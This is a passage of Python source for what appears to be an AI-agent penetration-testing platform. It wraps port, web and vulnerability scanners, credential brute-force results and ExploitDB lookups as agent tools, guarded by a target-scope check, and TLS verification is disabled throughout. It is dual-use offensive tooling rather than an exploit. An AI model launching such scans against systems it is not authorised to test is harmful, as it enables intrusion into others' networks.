# autogen-agents had no ./etl mount and could not import etl.scope_gate at all.
# The mount is added in docker-compose.yml alongside ./common.
#
# Gated at _make_request, the single chokepoint every dispatch method funnels
# through, and keyed on the TARGETS IN THE PAYLOAD rather than on the method
# name. That way a new start_* method is covered the day it is written, and a
# status poll — which carries no target — passes straight through.
try:
    from etl.scope_gate import enforce_target_scope
    _SCOPE_GATE_OK = True
    _SCOPE_GATE_ERROR = ""
except Exception as _scope_exc:            # pragma: no cover - deployment problem
    _SCOPE_GATE_OK = False
    _SCOPE_GATE_ERROR = str(_scope_exc)

# Payload keys that name a host. Values may be a string, a comma-separated
# string, or a list; all three shapes appear across the start_* methods.
_TARGET_KEYS = ("ip", "ips", "target", "targets", "host", "hosts",
                "domain", "domains", "url", "urls", "rhosts")


# Bound by the shared ceiling rather than a private number. Only calls that
# carry a target take a slot — a status poll must not consume scan capacity.
try:
    from common.tool_job import async_scan_slot, MAX_CONCURRENT_SCANS
    _SLOTS_OK = True
    _SLOTS_ERROR = ""
except Exception as _slot_exc:             # pragma: no cover - deployment problem
    _SLOTS_OK = False
    _SLOTS_ERROR = str(_slot_exc)
    MAX_CONCURRENT_SCANS = 0

    from contextlib import asynccontextmanager as _acm

    @_acm
    async def async_scan_slot(job_id: str = "", label: str = "scan", timeout=None):
        raise RuntimeError(
            f"scan slot pool unavailable ({_SLOTS_ERROR}) — check the "
            "./common:/app/common mount on autogen-agents")
        yield  # pragma: no cover


def _payload_targets(payload) -> list:
    out = []
    if not isinstance(payload, dict):
        return out
    for key in _TARGET_KEYS:
        val = payload.get(key)
        if val is None:
            continue
        items = val if isinstance(val, (list, tuple, set)) else [val]
        for item in items:
            for part in str(item).replace(",", " ").split():
                part = part.strip()
                if part:
                    out.append(part)
    return out


def _scope_refusal_for_payload(operation: str, payload) -> "str | None":
    """Refusal string when any target in the payload is out of scope.

    Every target is checked, not just the first: one authorised host in a list
    is not authorisation for the rest.
    """
    targets = _payload_targets(payload)
    if not targets:
        return None
    if not _SCOPE_GATE_OK:
        return (f"scope gate unavailable ({_SCOPE_GATE_ERROR}) — refusing "
                f"{operation}; check the ./etl:/app/etl mount on autogen-agents")
    for t in targets:
        refusal = enforce_target_scope(t, operation)
        if refusal:
            return refusal
    return None


class AsyncScanTools:
    """
    Async version of ScanTools for non-blocking operations.
    Uses httpx.AsyncClient for async HTTP requests.
    """

    def __init__(self):
        self.api_key = os.environ.get("API_KEY", "changeme")
        self.rag_api_url = os.environ.get("RAG_API_URL", "https://rag-api:8000")
        self.web_scanner_url = os.environ.get("WEB_SCANNER_URL", "https://web-scanner:8010")
        self.nuclei_url = os.environ.get("NUCLEI_URL", "https://nuclei-runner:8011")
        self.nmap_url = os.environ.get("NMAP_URL", "https://nmap_scanner:8012")
        self.playwright_url = os.environ.get("PLAYWRIGHT_URL", "https://playwright-scanner:8014")
        self.scan_recommender_url = os.environ.get("SCAN_RECOMMENDER_URL", "https://scan-recommender:8013")

        self.headers = {"x-api-key": self.api_key}
        self._client: Optional[httpx.AsyncClient] = None

    async def get_client(self) -> httpx.AsyncClient:
        """Get or create async HTTP client with connection pooling"""
        if self._client is None or self._client.is_closed:
            self._client = httpx.AsyncClient(
                timeout=300.0,
                verify=False,
                limits=httpx.Limits(
                    max_keepalive_connections=10,
                    max_connections=20,
                    keepalive_expiry=30.0
                ),
                http2=True
            )
        return self._client

    async def _make_request(self, method: str, url: str, operation: str, **kwargs) -> Dict:
        """Make async HTTP request with error handling"""
        refusal = _scope_refusal_for_payload(operation, kwargs.get("json")
                                             or kwargs.get("params"))
        if refusal:
            logger.warning("REFUSED %s: %s", operation, refusal)
            return {"error": "out_of_scope", "operation": operation,
                    "url": url, "detail": refusal}

        # A call that names a host is a scan; hold a slot for it. A status poll
        # carries no target and must not consume scan capacity.
        if _payload_targets(kwargs.get("json") or kwargs.get("params")):
            async with async_scan_slot(job_id=operation, label="agent-scan"):
                return await self._request_slotted(method, url, operation, **kwargs)
        return await self._request_slotted(method, url, operation, **kwargs)

    async def _request_slotted(self, method: str, url: str, operation: str, **kwargs) -> Dict:
        """Body of _make_request, after the scope gate and inside a scan slot."""
        client = await self.get_client()
        request_id = f"{operation}_{int(time.time()*1000)}"

        try:
            response = await client.request(method, url, **kwargs)

            if response.status_code >= 400:
                return {
                    "error": f"HTTP {response.status_code}",
                    "operation": operation,
                    "url": url,
                    "status_code": response.status_code,
                    "request_id": request_id,
                    "detail": response.text[:500]
                }

            try:
                return response.json()
            except json.JSONDecodeError:
                return {
                    "error": "JSON parsing failed",
                    "operation": operation,
                    "raw_response": response.text[:1000],
                    "request_id": request_id
                }

        except httpx.ConnectError as e:
            return {
                "error": "Connection failed",
                "operation": operation,
                "url": url,
                "message": str(e),
                "request_id": request_id
            }
        except httpx.TimeoutException as e:
            return {
                "error": "Request timeout",
                "operation": operation,
                "url": url,
                "message": str(e),
                "request_id": request_id
            }
        except Exception as e:
            return {
                "error": str(type(e).__name__),
                "operation": operation,
                "message": str(e),
                "request_id": request_id
            }

    async def query_open_ports(self, limit: int = 100) -> Dict:
        """Query open ports from the database"""
        return await self._make_request(
            method="GET",
            url=f"{self.rag_api_url}/ports/open",
            operation=f"Query open ports (limit={limit})",
            headers=self.headers,
            params={"limit": limit}
        )

    async def query_assets(self, limit: int = 100) -> Dict:
        """Query discovered assets from the database"""
        return await self._make_request(
            method="GET",
            url=f"{self.rag_api_url}/assets/",
            operation=f"Query assets (limit={limit})",
            headers=self.headers,
            params={"limit": limit}
        )

    async def query_vulnerabilities(self, severity: str = None, limit: int = 100) -> Dict:
        """Query vulnerability findings from the database"""
        params = {"limit": limit}
        if severity:
            params["severity"] = severity
        return await self._make_request(
            method="GET",
            url=f"{self.rag_api_url}/vulnerabilities/",
            operation=f"Query vulnerabilities (severity={severity}, limit={limit})",
            headers=self.headers,
            params=params
        )

    async def start_masscan(self, targets: str, ports: str = DEFAULT_QUICK_PORTS, rate: int = 1000) -> Dict:
        """Start a masscan+nmap scan"""
        return await self._make_request(
            method="POST",
            url=f"{self.nmap_url}/jobs/masscan-then-nmap",
            operation=f"Start masscan ({targets})",
            headers=self.headers,
            json={"targets": targets, "ports": ports, "rate": rate}
        )

    async def start_nmap_scan(self, ip_address: str, ports: str = DEFAULT_QUICK_PORTS) -> Dict:
        """Start an nmap scan on a single IP"""
        return await self._make_request(
            method="POST",
            url=f"{self.nmap_url}/jobs/nmap-from-masscan",
            operation=f"Start nmap ({ip_address}:{ports})",
            headers=self.headers,
            json={"ip": ip_address, "ports": ports}
        )

    async def start_udp_scan(self, targets: str, ports: str = "53,123,161,500,514,1900", top_ports: int = None, rate_limit: str = "100") -> Dict:
        """Start an nmap UDP scan"""
        target_list = [t.strip() for t in targets.split(',')]
        payload = {
            "targets": target_list,
            "ports": ports,
            "rate_limit": rate_limit
        }
        if top_ports:
            payload["top_ports"] = top_ports
        return await self._make_request(
            method="POST",
            url=f"{self.nmap_url}/jobs/nmap-udp",
            operation=f"Start UDP scan ({targets})",
            headers=self.headers,
            json=payload
        )

    async def start_web_scan(self, do_gobuster: bool = True, do_zap: bool = True, limit: int = 25) -> Dict:
        """Start web vulnerability scanning"""
        return await self._make_request(
            method="POST",
            url=f"{self.web_scanner_url}/jobs/web-scan",
            operation=f"Start web scan (gobuster={do_gobuster}, zap={do_zap})",
            headers=self.headers,
            json={"do_gobuster": do_gobuster, "do_zap": do_zap, "limit": limit}
        )

    async def start_pipeline_scan(
        self,
        target_url: str,
        wordlist: Optional[str] = None,
        max_paths_to_visit: int = 50,
        skip_gobuster: bool = False,
        skip_playwright: bool = False,
        skip_zap: bool = False,
        skip_nuclei: bool = False,
        skip_katana: bool = False
    ) -> Dict:
        """Start sequential web scan pipeline: Gobuster → Nikto → Playwright → Katana → ZAP → Nuclei"""
        return await self._make_request(
            method="POST",
            url=f"{self.web_scanner_url}/jobs/pipeline-scan",
            operation=f"Pipeline scan of {target_url}",
            headers=self.headers,
            json={
                "target_url": target_url,
                "wordlist": wordlist,
                "max_paths_to_visit": max_paths_to_visit,
                "skip_gobuster": skip_gobuster,
                "skip_playwright": skip_playwright,
                "skip_zap": skip_zap,
                "skip_nuclei": skip_nuclei,
                "skip_katana": skip_katana
            }
        )

    async def start_nuclei_scan(self, limit: int = 25, severity: str = "medium,high,critical", all_ports: bool = True) -> Dict:
        """Start nuclei vulnerability scanning on ALL open ports (not just web ports)"""
        return await self._make_request(
            method="POST",
            url=f"{self.nuclei_url}/jobs/nuclei-scan",
            operation=f"Start nuclei scan (severity={severity}, all_ports={all_ports})",
            headers=self.headers,
            json={"limit": limit, "severity": severity, "all_ports": all_ports}
        )

    async def start_playwright_scan(self, url: str = None, browser: str = "chromium", use_zap: bool = True) -> Dict:
        """Start Playwright browser security scan"""
        body = {"browser": browser, "use_zap": use_zap}
        if url:
            body["url"] = url
        return await self._make_request(
            method="POST",
            url=f"{self.playwright_url}/scan",
            operation=f"Start playwright scan (url={url})",
            headers=self.headers,
            json=body
        )

    async def query_exploitdb(self, query: str, top_k: int = 5) -> Dict:
        """Query ExploitDB via RAG API"""
        return await self._make_request(
            method="POST",
            url=f"{self.rag_api_url}/rag/query",
            operation=f"Query ExploitDB ({query})",
            headers=self.headers,
            json={"query": query, "top_k": top_k}
        )

    async def get_scan_recommendations(self, context: str) -> Dict:
        """Get AI-powered scan recommendations"""
        try:
            return await self._make_request(
                method="GET",
                url=f"{self.scan_recommender_url}/rag/ask",
                operation="Get scan recommendations",
                params={"q": context}
            )
        except Exception as e:
            # Fallback if RAG service is unavailable
            return {
                "recommendation": f"Run comprehensive port scan on target. Context: {context}",
                "suggested_tools": ["start_nmap_scan", "start_web_scan"],
                "priority": "high",
                "fallback": True
            }

    async def get_tool_recommendations(
        self,
        service: str = None,
        port: int = None,
        include_msf: bool = True,
        include_nuclei: bool = True,
        include_rag: bool = True
    ) -> Dict:
        """
        Get tool recommendations for testing a discovered service.

        Args:
            service: Service name (e.g., 'ssh', 'http', 'smb', 'mysql')
            port: Port number (used to infer service if service not provided)
            include_msf: Include Metasploit module recommendations
            include_nuclei: Include Nuclei scan tags
            include_rag: Include RAG context from methodology playbooks

        Returns:
            Dictionary with tool recommendations including:
                - tools: List of recommended tools with commands
                - metasploit: List of Metasploit modules
                - nuclei_tags: Tags for Nuclei scanner
                - common_vulns: Common vulnerabilities
        """
        params = {
            "include_msf": include_msf,
            "include_nuclei": include_nuclei,
            "include_rag": include_rag
        }
        if service:
            params["service"] = service
        if port:
            params["port"] = port

        return await self._make_request(
            method="GET",
            url=f"{self.scan_recommender_url}/rag/tools/recommend",
            operation=f"Get tool recommendations for service={service} port={port}",
            params=params
        )

    async def search_tools(self, query: str, tool_type: str = None) -> Dict:
        """Search for tools by name or purpose across all services."""
        params = {"q": query}
        if tool_type:
            params["tool_type"] = tool_type

        return await self._make_request(
            method="GET",
            url=f"{self.scan_recommender_url}/rag/tools/search",
            operation=f"Search tools: '{query}'",
            params=params
        )

    async def list_known_services(self) -> Dict:
        """Get list of all known services in the tool knowledge base."""
        return await self._make_request(
            method="GET",
            url=f"{self.scan_recommender_url}/rag/tools/services",
            operation="List known services"
        )

    async def check_system_status(self) -> Dict:
        """Check health status of all scanning services"""
        client = await self.get_client()
        services = {
            "rag_api": {"url": f"{self.rag_api_url}/health/quick", "healthy": False},
            "nmap_scanner": {"url": f"{self.nmap_url}/health", "healthy": False},
            "web_scanner": {"url": f"{self.web_scanner_url}/health", "healthy": False},
            "nuclei_runner": {"url": f"{self.nuclei_url}/health", "healthy": False},
            "playwright_scanner": {"url": f"{self.playwright_url}/health", "healthy": False},
            "scan_recommender": {"url": f"{self.scan_recommender_url}/health", "healthy": False},
        }

        async def check_service(name: str, info: dict):
            try:
                resp = await client.get(info["url"], timeout=5.0)
                info["healthy"] = resp.status_code == 200
                info["status_code"] = resp.status_code
            except Exception as e:
                info["healthy"] = False
                info["error"] = str(e)

        import asyncio
        await asyncio.gather(*[check_service(name, info) for name, info in services.items()])

        healthy_count = sum(1 for s in services.values() if s["healthy"])
        return {
            "services": services,
            "healthy_count": healthy_count,
            "total_count": len(services),
            "overall_status": "healthy" if healthy_count == len(services) else "degraded" if healthy_count > 0 else "unhealthy"
        }

    async def close(self):
        """Close async HTTP client"""
        if self._client and not self._client.is_closed:
            await self._client.aclose()


# Async singleton instance (lazy loaded)
_async_scan_tools: Optional[AsyncScanTools] = None


async def get_async_scan_tools() -> AsyncScanTools:
    """Get or create the AsyncScanTools singleton instance"""
    global _async_scan_tools
    if _async_scan_tools is None:
        _async_scan_tools = AsyncScanTools()
    return _async_scan_tools


# Async function wrappers for MCP
async def query_open_ports_async(limit: int = 100) -> str:
    """Async: Query open ports from the database. Returns JSON string."""
    tools = await get_async_scan_tools()
    result = await tools.query_open_ports(limit)
    return json.dumps(result, indent=2)


async def query_assets_async(limit: int = 100) -> str:
    """Async: Query discovered assets from the database. Returns JSON string."""
    tools = await get_async_scan_tools()
    result = await tools.query_assets(limit)
    return json.dumps(result, indent=2)


async def query_vulnerabilities_async(severity: str = None, limit: int = 100) -> str:
    """Async: Query vulnerability findings. Returns JSON string."""
    tools = await get_async_scan_tools()
    result = await tools.query_vulnerabilities(severity, limit)
    return json.dumps(result, indent=2)


async def start_masscan_async(targets: str, ports: str = DEFAULT_QUICK_PORTS, rate: int = 1000) -> str:
    """Async: Start a masscan+nmap scan. Returns JSON string."""
    tools = await get_async_scan_tools()
    result = await tools.start_masscan(targets, ports, rate)
    return json.dumps(result, indent=2)


async def start_nmap_scan_async(ip_address: str, ports: str = DEFAULT_QUICK_PORTS) -> str:
    """Async: Start an nmap scan. Returns JSON string."""
    tools = await get_async_scan_tools()
    result = await tools.start_nmap_scan(ip_address, ports)
    return json.dumps(result, indent=2)


async def start_udp_scan_async(targets: str, ports: str = "53,123,161,500,514,1900", top_ports: int = None, rate_limit: str = "100") -> str:
    """Async: Start an nmap UDP scan. Returns JSON string."""
    tools = await get_async_scan_tools()
    result = await tools.start_udp_scan(targets, ports, top_ports, rate_limit)
    return json.dumps(result, indent=2)


async def start_web_scan_async(do_gobuster: bool = True, do_zap: bool = True, limit: int = 25) -> str:
    """Async: Start web vulnerability scanning. Returns JSON string."""
    tools = await get_async_scan_tools()
    result = await tools.start_web_scan(do_gobuster, do_zap, limit)
    return json.dumps(result, indent=2)


async def start_pipeline_scan_async(
    target_url: str,
    wordlist: str = None,
    max_paths_to_visit: int = 50,
    skip_gobuster: bool = False,
    skip_playwright: bool = False,
    skip_zap: bool = False,
    skip_nuclei: bool = False,
    skip_katana: bool = False
) -> str:
    """Async: Start sequential web scan pipeline: Gobuster → Nikto → Playwright → Katana → ZAP → Nuclei. Returns JSON string."""
    tools = await get_async_scan_tools()
    result = await tools.start_pipeline_scan(
        target_url, wordlist, max_paths_to_visit,
        skip_gobuster, skip_playwright, skip_zap, skip_nuclei, skip_katana
    )
    return json.dumps(result, indent=2)


async def start_nuclei_scan_async(limit: int = 25, severity: str = "medium,high,critical", all_ports: bool = True) -> str:
    """Async: Start nuclei vulnerability scanning on ALL open ports. Returns JSON string."""
    tools = await get_async_scan_tools()
    result = await tools.start_nuclei_scan(limit, severity, all_ports)
    return json.dumps(result, indent=2)


async def start_playwright_scan_async(url: str = None, browser: str = "chromium", use_zap: bool = True) -> str:
    """Async: Start Playwright browser security scan. Returns JSON string."""
    tools = await get_async_scan_tools()
    result = await tools.start_playwright_scan(url, browser, use_zap)
    return json.dumps(result, indent=2)


async def check_system_status_async() -> str:
    """Async: Check health status of all scanning services. Returns JSON string."""
    tools = await get_async_scan_tools()
    result = await tools.check_system_status()
    return json.dumps(result, indent=2)


# ===============================
# Sync Scan Tools (original)
# ===============================

# Singleton instance (lazy loaded)
_scan_tools = None

# Thread-local proxy context — set by session threads so module-level
# functions automatically route scans through the correct proxy.
import threading
_thread_local = threading.local()


def set_session_proxy(proxy: str | None):
    """Set the proxy for the current thread's scan tools.
    Called at the start of a pentest session thread."""
    _thread_local.proxy = proxy


def get_session_proxy() -> str | None:
    """Get the proxy for the current thread, if any."""
    return getattr(_thread_local, 'proxy', None)


def get_scan_tools(proxy: str = None) -> ScanTools:
    """Get or create a ScanTools instance.

    Priority: explicit proxy arg > thread-local session proxy > no proxy (singleton).
    """
    effective_proxy = proxy or get_session_proxy()
    if effective_proxy:
        return ScanTools(proxy=effective_proxy)
    global _scan_tools
    if _scan_tools is None:
        _scan_tools = ScanTools()
    return _scan_tools

# Backward compatibility: keep 'scan_tools' name for existing code
# This is lazily initialized on first access


class _LazyInit:
    """Lazy initialization wrapper for backward compatibility"""
    _instance = None

    def __getattr__(self, name):
        if self._instance is None:
            self._instance = get_scan_tools()
        return getattr(self._instance, name)


scan_tools = _LazyInit()


# Function wrappers for Autogen function calling
# Bounds on how much operator knowledge is injected into the agent's context per
# port-discovery call. A host with many open ports must not crowd out the rest of
# the conversation.
_GUIDANCE_MAX_SERVICES = 8
_GUIDANCE_TRAINING_CHARS = 700


def _operator_guidance_for(ports: List[Dict], max_services: int = _GUIDANCE_MAX_SERVICES) -> List[Dict]:
    """Operator-authored guidance for the services just discovered.

    This is what connects an ingested walkthrough to the agent's next decision.
    Rules drafted from a walkthrough live in service_prompts and were, until now,
    read only by the /next_scan recommender — the agent planned without them. By
    attaching them to the port list the agent already queries, the guidance lands
    in context at exactly the moment the agent is choosing what to run.

    Deliberately narrow:
      * only (service, port) pairs that actually resolved to a rule — services
        with no authored guidance add nothing and are omitted entirely
      * deduplicated, and capped at `max_services`, so a host with fifty open
        ports cannot flood the agent's context window
      * training context truncated; it is retrieved prose, useful as a hint but
        not worth thousands of tokens per service
      * every failure is non-fatal — the port list is the primary payload and
        must survive scan-recommender being unreachable
    """
    base = os.environ.get("SCAN_RECOMMENDER_URL", "https://scan-recommender:8013")
    seen, out = set(), []
    for p in ports:
        service = (p.get("service") or "").strip()
        port = p.get("port")
        if not service or service.lower() in ("unknown", "tcpwrapped"):
            continue
        key = (service.lower(), port)
        if key in seen:
            continue
        seen.add(key)
        if len(out) >= max_services:
            break
        try:
            resp = _httpx.get(
                f"{base}/kb/prompts/resolve",
                params={"service": service, "port": port},
                timeout=10.0, verify=False,
            )
            if resp.status_code != 200:
                continue
            data = resp.json()
        except Exception as e:            # network, TLS, JSON — all non-fatal
            logger.debug("guidance lookup failed for %s:%s — %s", service, port, e)
            continue
        guidance = (data.get("guidance_block") or "").strip()
        if not guidance:
            continue                      # no authored rule for this service
        entry = {"service": service, "port": port, "guidance": guidance}
        training = (data.get("training_context") or "").strip()
        if training:
            entry["training_context"] = training[:_GUIDANCE_TRAINING_CHARS]
        out.append(entry)
    return out


def query_open_ports(target: str = None, limit: int = 100) -> str:
    """
    Query open ports from the database.

    Args:
        target: Optional IP address to filter results (e.g., "192.168.1.150")
        limit: Maximum number of results

    Returns JSON string with open ports data, plus `operator_guidance` — rules
    the operator authored (often ingested from a walkthrough) for the services
    found. Use that guidance when choosing which tools to run next; it reflects
    technique proven against these services and overrides generic defaults.
    """
    # Push the host filter to the server (host(a.ip)=, CIDR-safe). Without this
    # the endpoint returns a flat LIMIT-capped page across every host, so an
    # internal lab IP falls outside the page and the client filter below sees 0.
    result = get_scan_tools().query_open_ports(limit, ip=target or None)

    # rag-api returns the rows under "items"; older callers looked for "ports",
    # which silently matched nothing — the target filter below never ran, so
    # asking for one host returned every host. Accept both keys.
    rows_key = "items" if isinstance(result, dict) and "items" in result else "ports"

    # Filter by target if specified. Stored IPs may carry a /32 CIDR suffix
    # (assets.ip is inet), so strip it before comparing or a host filter never
    # matches and the agent sees zero services for a host it just scanned.
    if target and isinstance(result, dict) and rows_key in result:
        import re as _re
        tgt = _re.sub(r"/[0-9]+$", "", str(target))
        def _m(p):
            pip = _re.sub(r"/[0-9]+$", "", str(p.get("ip") or ""))
            return pip == tgt or str(p.get("host") or "") == tgt
        result[rows_key] = [p for p in result[rows_key] if _m(p)]
        result["filtered_by"] = target
        result["count"] = len(result[rows_key])

    if isinstance(result, dict) and result.get(rows_key):
        guidance = _operator_guidance_for(result[rows_key])
        if guidance:
            result["operator_guidance"] = guidance
            result["operator_guidance_note"] = (
                "Operator-authored guidance for the services above. Prefer these "
                "techniques over generic defaults when selecting the next tool."
            )
            logger.info("Attached operator guidance for %d service(s) to port list",
                        len(guidance))

    return json.dumps(result, indent=2)


def query_assets(target: str = None, limit: int = 100) -> str:
    """
    Query discovered assets from the database.

    ONLY accepts 'target' and 'limit' parameters. Do NOT pass ip_addresses, ports, services, or any other arguments.

    Args:
        target: Optional IP address to filter results (e.g., "192.168.1.150")
        limit: Maximum number of results

    Returns JSON string with assets data.
    """
    result = get_scan_tools().query_assets(limit)

    # Filter by target if specified (strip a /32 CIDR suffix — see query_open_ports).
    if target and isinstance(result, dict) and "assets" in result:
        import re as _re
        tgt = _re.sub(r"/[0-9]+$", "", str(target))
        result["assets"] = [a for a in result["assets"]
                            if _re.sub(r"/[0-9]+$", "", str(a.get("ip") or "")) == tgt
                            or str(a.get("host") or "") == tgt]
        result["filtered_by"] = target

    return json.dumps(result, indent=2)


def query_vulnerabilities(severity: str = None, limit: int = 100) -> str:
    """
    Query vulnerabilities from the database.

    Args:
        severity: Filter by severity (info, low, medium, high, critical)
        limit: Maximum number of results

    Returns JSON string.
    """
    result = get_scan_tools().query_vulnerabilities(severity, limit)
    return json.dumps(result, indent=2)


def get_web_findings(target: str = None, source: str = None, limit: int = 100) -> str:
    """
    Query web application findings from the database (Gobuster directories, ZAP vulnerabilities, Playwright results).

    Args:
        target: Optional IP address to filter results (e.g., "192.168.1.150")
        source: Optional source filter (gobuster, zap, playwright)
        limit: Maximum number of results

    Returns JSON string with web findings data.
    """
    result = get_scan_tools().get_web_findings(limit)

    # Filter by target IP if specified
    if target and isinstance(result, dict):
        for key in ("findings", "web_findings"):
            if key in result:
                result[key] = [
                    f for f in result[key]
                    if f.get("ip") == target or f.get("host") == target
                    or (f.get("url") and target in f.get("url", ""))
                ]
                result["filtered_by_target"] = target

    # Filter by source if specified
    if source and isinstance(result, dict):
        for key in ("findings", "web_findings"):
            if key in result:
                result[key] = [
                    f for f in result[key]
                    if f.get("source", "").lower() == source.lower()
                ]
                result["filtered_by_source"] = source

    return json.dumps(result, indent=2)


def query_credential_findings(target: str = None, limit: int = 100) -> str:
    """
    Query credential/brute-force findings from Brutus testing.

    Args:
        target: Optional IP address to filter results (e.g., "192.168.1.150")
        limit: Maximum number of results

    Returns JSON string with credential test results (usernames, protocols, valid/invalid).
    """
    tools = get_scan_tools()
    params = {
        "source": "brutus",
        "limit": limit,
    }
    if target:
        params["ip"] = target

    result = tools._make_request(
        method="GET",
        url=f"{tools.rag_api_url}/findings/search",
        operation=f"Query credential findings (target={target}, limit={limit})",
        headers=tools.headers,
        params=params,
    )
    return json.dumps(result, indent=2)


def search_all_findings(target: str = None, severity: str = None, source: str = None, limit: int = 200) -> str:
    """
    Unified search across ALL finding types (vulns, web_findings, playwright_findings, credentials).

    This is the most comprehensive query — it returns findings from nmap, nuclei, zap,
    gobuster, playwright, and brutus in one call.

    Args:
        target: Optional IP address to filter results (e.g., "192.168.1.150")
        severity: Optional severity filter (info, low, medium, high, critical)
        source: Optional source filter (nmap, nuclei, zap, gobuster, playwright, brutus)
        limit: Maximum number of results

    Returns JSON string with unified findings data.
    """
    tools = get_scan_tools()
    params = {"limit": limit}
    if target:
        params["ip"] = target
    if severity:
        params["severity"] = severity
    if source:
        params["source"] = source

    result = tools._make_request(
        method="GET",
        url=f"{tools.rag_api_url}/findings/search",
        operation=f"Search all findings (target={target}, severity={severity}, source={source}, limit={limit})",
        headers=tools.headers,
        params=params,
    )
    return json.dumps(result, indent=2)


def start_masscan(targets: str = None, target: str = None, ports: str = DEFAULT_QUICK_PORTS, rate: int = 1000) -> str:
    """
    Start a fast Masscan port scan (no service detection).

    Args:
        targets: Comma-separated list of IPs or CIDRs (e.g., "192.168.1.0/24,10.0.0.1")
        target: Alias for targets (single IP also works)
        ports: Port range. Omit it — the default is nmap's top-1000, the 1000 most
               commonly OPEN ports. Do NOT pass "1-1000": that is the first 1000 port
               NUMBERS, which misses mysql 3306, postgresql 5432, vnc 5900 and tomcat
               8180. Pass a value only for a genuinely specific scope (e.g. "80,443").
        rate: Scan rate in packets per second

    Returns JSON string with job information.
    """
    # Accept either 'target' or 'targets' parameter
    targets = targets or target
    if not targets:
        return json.dumps({"error": "No target specified. Use 'targets' parameter."})
    target_list = [t.strip() for t in targets.split(',')]
    result = get_scan_tools().start_masscan_only(target_list, ports, rate)

    # Track the scan job
    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("masscan", job_id, {"targets": target_list, "ports": ports, "rate": rate})
        result["next_step"] = (
            f"Scan started with job_id='{job_id}'. "
            f"Call wait_for_job_completion(job_id='{job_id}', job_type='masscan') to wait, "
            f"or get_session_scan_status() to check all scans (no job_id needed)."
        )

    return json.dumps(result, indent=2)


def start_nmap_scan(ip_address: str, ports: str = DEFAULT_QUICK_PORTS, service_detection: bool = True, version_intensity: int = 9, enable_scripts: bool = True) -> str:
    """
    Start an Nmap port scan with service detection (Masscan + Nmap).

    Args:
        ip_address: Target IP address or CIDR
        ports: Port range. Omit it — the default is nmap's top-1000, the 1000 most
               commonly OPEN ports. Do NOT pass "1-1000": that is the first 1000 port
               NUMBERS, which misses mysql 3306, postgresql 5432, vnc 5900 and tomcat
               8180. Pass a value only for a genuinely specific scope (e.g. "80,443").
        service_detection: Enable service version detection (-sV flag)
        version_intensity: Service detection intensity 0-9 (9=aggressive)
        enable_scripts: Enable NSE scripts for banner grabbing and vulnerability detection

    Returns JSON string with job information.
    """
    result = get_scan_tools().start_nmap_scan(ip_address, ports, service_detection, version_intensity, enable_scripts)

    # Track the scan job
    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("nmap", job_id, {"ip_address": ip_address, "ports": ports})
        result["next_step"] = (
            f"Scan started with job_id='{job_id}'. "
            f"Call wait_for_job_completion(job_id='{job_id}', job_type='nmap') to wait, "
            f"or get_session_scan_status() to check all scans (no job_id needed)."
        )

    return json.dumps(result, indent=2)


def start_udp_scan(
    targets: str = None,
    target: str = None,  # Alias for targets (LLMs often use singular)
    ports: str = "53,67,68,69,123,137,138,161,162,500,514,520,1434,1900,4500,5353",
    top_ports: int = None,
    rate_limit: str = "100"
) -> str:
    """
    Start an Nmap UDP scan.

    UDP scans are slower than TCP scans but important for discovering
    services like DNS, SNMP, NTP, and other UDP-based protocols.

    This should be run AFTER TCP scans (masscan + nmap) complete.

    Args:
        targets: Comma-separated list of IPs or CIDRs (e.g., "192.168.1.0/24,10.0.0.1")
        target: Alias for targets (single IP also works)
        ports: UDP ports to scan (default: common UDP ports like DNS, SNMP, NTP, etc.)
        top_ports: Scan top N UDP ports instead of specific ports
        rate_limit: Packets per second (default: 100, UDP needs slower rate)

    Returns JSON string with job information.
    """
    # Accept either 'target' or 'targets' parameter
    targets = targets or target
    if not targets:
        return json.dumps({"error": "No target specified. Use 'targets' parameter."})
    target_list = [t.strip() for t in targets.split(',')]
    result = get_scan_tools().start_udp_scan(target_list, ports, top_ports, rate_limit)

    # Track the scan job
    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("udp", job_id, {"targets": target_list, "ports": ports})

    return json.dumps(result, indent=2)


def start_full_scan(
    targets: str = None,
    target: str = None,
    quick_ports: str = DEFAULT_QUICK_PORTS,
    full_ports: str = "",
    rate: int = 1000,
    run_smb_vuln_scan: bool = False,
    run_credential_check: bool = False
) -> str:
    """
    Start a quick port scan with service detection.

    Default: nmap's top-1000 (the 1000 most commonly OPEN ports, frequency-ranked)
    plus any high WEB_PORTS from settings, with service detection. A full-range
    masscan follow-up over 1-65535 is scheduled automatically and runs in parallel,
    so you do NOT need to call start_deep_port_scan afterwards.

    Do not pass quick_ports="1-1000". That is the first 1000 port NUMBERS, not the
    1000 most commonly open ports — it misses mysql 3306, postgresql 5432, vnc 5900
    and tomcat 8180. It will be upgraded to the top-1000 profile anyway.

    Phases:
    1. Quick masscan over the top-1000
    2. Nmap service detection on discovered ports, in PARALLEL with a masscan over 1-65535
    3. Service detection on any additional ports found in phase 2

    Args:
        targets: Comma-separated string of IPs or CIDRs (e.g. "192.168.1.150")
        target: Alias for targets
        quick_ports: Ports for quick scan (default: nmap top-1000 + high WEB_PORTS)
        full_ports: Ports for the follow-up sweep (default: automatic, 1-65535)
        rate: Masscan rate in packets per second
        run_smb_vuln_scan: Run SMB vuln scan if 139/445 found (default False - decide after reviewing results)
        run_credential_check: Run credential checking on auth services (default False - decide after reviewing results)

    Returns JSON string with job information.
    """
    targets = targets or target
    if not targets:
        return json.dumps({"error": "No target specified. Use 'targets' parameter with a string like '192.168.1.150'."})
    # Handle both string and list inputs
    if isinstance(targets, list):
        target_list = [str(t).strip() for t in targets]
    else:
        target_list = [t.strip() for t in str(targets).split(',')]

    # Guard against LLM passing null/None/empty for optional params
    if not quick_ports:
        quick_ports = DEFAULT_QUICK_PORTS
    else:
        # An explicitly-passed sequential low range is upgraded, not obeyed —
        # defaulting the parameter alone never fixed this, because the model
        # passes "1-1000" outright.
        quick_ports = _upgrade_sequential_quick_ports(quick_ports)
    if rate is None:
        rate = 1000

    # Session-level port scope (set from the operator's Port Scope selector)
    # overrides the agent's default quick range.  The operator's explicit
    # choice outranks whatever the LLM decided to pass — that is the whole
    # point of the selector.
    session_scope = scan_tracker.get_port_scope()
    if session_scope and quick_ports != session_scope:
        logger.info(
            f"Port scope '{scan_tracker.get_port_profile()}' overrides "
            f"quick_ports={quick_ports!r} → {session_scope[:40]}..."
        )
        quick_ports = session_scope
        # A session scope already defines the full sweep; a second deep pass
        # over the full range would rescan ports the operator either asked for
